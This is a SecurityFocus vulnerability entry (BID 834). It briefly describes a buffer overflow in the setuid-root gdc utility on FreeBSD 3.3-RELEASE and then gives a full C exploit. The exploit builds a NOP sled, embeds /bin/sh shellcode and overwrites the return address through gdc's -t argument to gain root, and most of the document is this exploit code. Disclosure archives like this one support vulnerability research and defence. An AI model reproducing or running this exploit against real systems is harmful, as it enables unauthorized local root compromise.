source: http://www.securityfocus.com/bid/834/info

There is a buffer overflow vulnerability known to be present in the version of gdc shipped with the 3.3-RELEASE version of FreeBSD. By default, only users in group wheel have execute access to gdc. The overflow occurs when the argument passed along with the -t flag (time) exceeds its predefined buffer length. It is possible to then corrupt the stack and alter the flow of execution (and execute arbitrary code). With gdc setuid root by default, this can lead to a local root compromise if exploited by users who have or gain access of or belong to the wheel group (or trusted gated group).

/* 

 * gdc exploit for Freebsd-3.3 yields euid=0(root)
 * by default, only group wheel (or whatever your trusted gated group is)=

 * and root can run gdc
 * Brock Tellier btellier@usa.net
 */


#include <stdio.h>

char shell[] = /* mudge@l0pht.com */
  "\xeb\x35\x5e\x59\x33\xc0\x89\x46\xf5\x83\xc8\x07\x66\x89\x46\xf9"
   "\x8d\x1e\x89\x5e\x0b\x33\xd2\x52\x89\x56\x07\x89\x56\x0f\x8d\x46"
   "\x0b\x50\x8d\x06\x50\xb8\x7b\x56\x34\x12\x35\x40\x56\x34\x12\x51"
   "\x9a>:)(:<\xe8\xc6\xff\xff\xff/bin/sh";


main (int argc, char *argv[] ) {
 int x = 0;
 int y = 0;
 int offset = 0;
 int bsize = 4093;
 char buf[bsize];
 int eip = 0xbfbfdb65; /* works for me */

 if (argv[1]) { =

   offset = atoi(argv[1]);
   eip = eip + offset;
 }
 fprintf(stderr, "gdc exploit for FreeBSD 3.3-RELEASE <btellier@usa.net>\=
n");
 fprintf(stderr, "eip=0x%x offset=%d buflen=%d\n", eip, offset, bsi=
ze);
 =

 for ( x = 0; x < 937; x++) buf[x] = 0x90;
     fprintf(stderr, "NOPs to %d\n", x);
 =

 for ( y = 0; y < 67 ; x++, y++) buf[x] = shell[y];
     fprintf(stderr, "Shellcode to %d\n",x);
  =

  buf[x++] =  eip & 0x000000ff;
  buf[x++] = (eip & 0x0000ff00) >> 8;
  buf[x++] = (eip & 0x00ff0000) >> 16;
  buf[x++] = (eip & 0xff000000) >> 24;
     fprintf(stderr, "eip to %d\n",x);

 buf[bsize - 1]='\0';

 execl("/usr/local/bin/gdc", "gdc", "-t", buf, NULL);

}